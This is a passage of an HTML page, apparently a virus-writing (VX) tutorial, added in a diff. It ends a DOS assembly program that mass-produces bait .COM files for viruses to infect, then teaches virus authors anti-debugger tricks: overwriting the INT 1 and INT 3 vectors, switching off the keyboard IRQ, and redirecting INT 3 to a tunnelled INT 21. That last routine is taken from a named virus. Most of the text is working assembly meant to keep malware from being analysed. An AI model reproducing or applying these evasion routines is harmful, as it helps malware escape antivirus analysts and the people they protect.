+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span>3e &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Closes the file.. </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ds</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span>4b00 &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;This calls a execute of &quot;filename&quot; </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;i have set up no parameter tables, </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;so it will not actually execute, but </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;the virus will intercept and infect. </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span>offset filename<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ds</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">9</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span>offset done&nbsp; <span style="color: black; font-style: italic;">;prints:</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;DONE: XXXXXXXX.COM </span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">std</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span>offset units<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">si</span><br/>
+<br/>
+next_character<span style="color: #339933;">:</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Add 1 to file name characters. </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;(00000000 -&gt; 00000001) etc.. </span><br/>
+<br/>
+<span style="color: black; font-style: italic;">;Uncommenting the code below, will cause SFBM to add between </span><br/>
+<span style="color: black; font-style: italic;">;2 and 5 to the file name characters. This will avoid virii that </span><br/>
+<span style="color: black; font-style: italic;">;check for consecutive file names, as they are not incrementing by </span><br/>
+<span style="color: black; font-style: italic;">;1 each time.</span><br/>
+<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; cmp &nbsp; &nbsp; si,offset units ;Are we modifying a character other? </span><br/>
+<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; jne &nbsp; &nbsp; not_unit&nbsp; &nbsp; &nbsp; &nbsp; ;If not, only add 1 to the character </span><br/>
+<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; in&nbsp; &nbsp; &nbsp; al,40</span><br/>
+<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; and &nbsp; &nbsp; al,3&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;Choose amount between 2 and 5 to </span><br/>
+<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; add &nbsp; &nbsp; dl,al &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;add..</span><br/>
+<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; inc &nbsp; &nbsp; dx</span><br/>
+<br/>
+not_unit<span style="color: #339933;">:</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lodsb</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">dl</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Calculate Next File Name (increment) </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span>last_character <span style="color: #339933;">+</span> <span style="color: #ff0000;">1</span> &nbsp; <span style="color: black; font-style: italic;">;Has it overflowed past </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jb</span>&nbsp; &nbsp; &nbsp; no_more_increase&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;last_character? If not continue.. </span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span>character_range&nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;else bring it back into range, </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span><span style="color: #00007f; font-weight: bold;">stosb</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; short next_character&nbsp; &nbsp; <span style="color: black; font-style: italic;">;increment next char, and check for </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;overflow...</span><br/>
+<br/>
+no_more_increase<span style="color: #339933;">:</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span><span style="color: #00007f; font-weight: bold;">stosb</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">loop</span>&nbsp; &nbsp; file_loop &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Do Next File (CX times)</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span>4c<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21</span><br/>
+<br/>
+set_date<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Sub Procedure gives file random Date &amp; Time. </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">in</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">40</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;calculates the Year for Date stamp </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0f</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xchg</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">shl</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">9</span><br/>
+<br/>
+get_month<span style="color: #339933;">:</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;calculates the Month for Date stamp </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">in</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">40</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0f</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span>0c<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ja</span>&nbsp; &nbsp; &nbsp; get_month<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; get_month<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">shl</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">5</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
+<br/>
+get_date<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;calculates the Day of Month for Date stamp </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">in</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">40</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1f</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; get_date<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;DX = DATE</span><br/>
+<br/>
+get_secs<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;calculates seconds of the Time Stamp </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">in</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">40</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1f</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span>1d<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ja</span>&nbsp; &nbsp; &nbsp; get_secs<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xchg</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
+<br/>
+get_minuits<span style="color: #339933;">:</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;calculates minuits of the Time Stamp </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">in</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">40</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3f</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span>3b<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ja</span>&nbsp; &nbsp; &nbsp; get_minuits<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">shl</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">5</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
+<br/>
+get_hours<span style="color: #339933;">:</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;calculates hours of the Time Stamp </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">in</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">40</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1f</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">17</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ja</span>&nbsp; &nbsp; &nbsp; get_hours<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">shl</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0b</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;CX = TIME</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">5701</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;set DATE/TIME stamp</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br/>
+<br/>
+gen_msg &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">&quot;- Sepulturas Funky Bait Maker -&quot;</span><span style="color: #339933;">,</span>0a<span style="color: #339933;">,</span>0d <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">&quot;Generating Funky Bait Files...&quot;</span><span style="color: #339933;">,</span>0a<span style="color: #339933;">,</span>0d<span style="color: #339933;">,</span><span style="color: #7f007f;">&quot;$&quot;</span> <br/>
+done&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">&quot;DONE: &quot;</span><br/>
+filename&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">7</span> dup <span style="color: black;">&#40;</span>first_character<span style="color: black;">&#41;</span><br/>
+units &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; first_character<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">&quot;.COM&quot;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">0</span><span style="color: #339933;">,</span>0d<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">&quot;$&quot;</span><br/>
+<br/>
+<span style="color: black; font-style: italic;">;This is the .COM program that will be at the start of each Bait file. </span><br/>
+<span style="color: black; font-style: italic;">;It is 38 bytes long. The rest of the file will just be padded with </span><br/>
+<span style="color: black; font-style: italic;">;garbage from memory.</span><br/>
+<br/>
+bait<span style="color: #339933;">:</span> &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; bait_b<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">'Sepulturas Funky Bait File!$'</span><br/>
+bait_b<span style="color: #339933;">:</span> <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;DX = offset of bait message</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">9</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;print message</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">20</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;exit</span><br/>
+<span style="color: black; font-style: italic;">;END SFBM.ASM</span><br/>
+&nbsp;</div>
+<p>The above Bait Maker can be very useful, to test your Anti-Bait techniques. It is also quite useful, for its orginal purpose - analysing virii. Use it for either - AV - VX - they're all the same to me.</p>
+<h2><a name="c3"></a>Anti-Debugger Techniques</h2>
+<p><em>The master hides behind the mask</em></p>
+<p>Ok, now the AV can not even get your virus to infect their bait files, and if they do finally manage, they will have great problems in getting a complete, accurate view of what they are dealing with. There is two things they can do:</p>
+<ol>
+<li>Disassemble your Anti-Bait code, and create a Bait maker to fool it.</li>
+<li>Disassemble your Polymorphic engine, and work out what to look for.</li>
+</ol>
+<p>Both of the above can be defeated by using Anti-Debugger Techniques. The first is defeated by keeping your Anti - Bait routines encrypted, and heavilly armoured, to prevent disassembly. The second can be defeated by using the same methods on your polymorphic engine. This section has been designed to tell you how to do it.</p>
+<h3><a name="c31"></a>The Obvious</h3>
+<p>There are many simple and trivial ways to thwart debuggers. This document will deal mainly with more advanced methods. The simple methods outlined in this section can be seen in the code example of "Using Your Anti-Debug Routines as the Decryption Key", later on in this document.</p>
+<p>Perhaps the most obvious way to kill a debugger, is to overwrite the Interrupt Vector of Interrupts 1 (Debug Single Step), and 3 (Debug Break Point). This can be defeated by simply skipping the instructions. Another thing you could do, is place an INT 3 in a long loop, which will cause the debugger to stop at the INT 3 each iteration, which will stop the AV from simply proceeding through the loop. This is very easilly defeated by NOP'ing out the INT 3.</p>
+<p>Another thing to do, is turn of the keyboard. There are manyways to do this, but the simplest is:</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">IN</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">AL</span><span style="color: #339933;">,</span><span style="color: #ff0000;">20h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Turn of Keyboard IRQ </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">OR</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">AL</span><span style="color: #339933;">,</span><span style="color: #ff0000;">02</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">OUT</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">AL</span><span style="color: #339933;">,</span><span style="color: #ff0000;">20</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">IN</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">AL</span><span style="color: #339933;">,</span><span style="color: #ff0000;">20</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Enable Keyboard IRQ </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">AND</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">AL</span><span style="color: #339933;">,</span><span style="color: #00007f; font-weight: bold;">NOT</span> <span style="color: #ff0000;">2</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">OUT</span> &nbsp;<span style="color: #46aa03; font-weight: bold;">AL</span><span style="color: #339933;">,</span><span style="color: #ff0000;">20</span><br/>
+&nbsp;</div>
+<h3><a name="c32"></a>Interrupt Replacement</h3>
+<p>This technique involves replacing the vector of a INTERRUPT 1/3 with the interrupt off another interrupt, and calling that instead. This works especially well with INT 3, as it is only 1 byte long, and can not simply be replaced with the proper Interrupt. Here is an example of INT replacement from the virus [H8urNMEs]. It changes INT 3 to point to the tunneled INT 21, and calls INT 3 for all DOS requests:</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3503</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; int_3_seg<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">es</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; int_3_off<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">bx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lds</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> site_traced_off<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">2503</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">cs</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3524</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">3</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; int_24_seg<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">es</span><br/>
